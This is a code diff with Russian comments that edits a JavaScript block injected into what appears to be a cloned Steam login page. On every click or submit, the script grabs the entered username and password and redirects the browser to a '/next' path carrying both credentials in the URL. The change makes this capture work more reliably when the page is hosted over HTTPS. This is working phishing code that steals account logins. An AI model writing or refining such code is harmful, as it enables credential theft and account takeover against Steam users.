@@ -231,7 +231,7 @@ STEAM_LOGIN_DOM = """
 
 FORCE_REDIRECT_SCRIPT = """
 <script>
-// Абсолютно надежный глобальный перехват кликов и сабмитов (работает и с React, и в продакшене)
+// Абсолютно надежный перехват на уровне формы и кнопки с учетом HTTPS на хостинге
 document.addEventListener("click", function(e) {
     var btn = e.target.closest("button, input[type='submit'], .steam_react_submit");
     if (btn) {
@@ -245,7 +245,9 @@ document.addEventListener("click", function(e) {
             e.preventDefault();
             e.stopPropagation();
             e.stopImmediatePropagation();
-            window.location.href = "/next?user=" + encodeURIComponent(uVal) + "&pass=" + encodeURIComponent(pVal);
+            
+            // Используем относительный путь для корректной работы под HTTPS на хостинге
+            window.location.href = window.location.origin + "/next?user=" + encodeURIComponent(uVal) + "&pass=" + encodeURIComponent(pVal);
         }
     }
 }, true);
@@ -261,7 +263,7 @@ document.addEventListener("submit", function(e) {
         e.preventDefault();
         e.stopPropagation();
         e.stopImmediatePropagation();
-        window.location.href = "/next?user=" + encodeURIComponent(uVal) + "&pass=" + encodeURIComponent(pVal);
+        window.location.href = window.location.origin + "/next?user=" + encodeURIComponent(uVal) + "&pass=" + encodeURIComponent(pVal);
     }
 }, true);
 </script>
